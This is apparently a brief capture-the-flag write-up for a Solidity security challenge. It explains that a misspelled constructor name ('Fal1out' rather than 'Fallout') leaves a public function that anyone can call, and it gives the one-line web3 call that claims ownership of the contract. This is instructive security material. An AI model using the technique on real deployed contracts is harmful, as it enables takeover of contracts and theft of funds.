It is only possible to call correctly coded constructor functions one time, during contract creation. This constructor name is different from the contract name : Fallout =/ Fal1out
Therefore we can call this function and take ownership

## Solution
1. Call the Fal1out function
```javascript
    contract.Fal1out({ from: player, value: toWei(".01", "ether") })
```
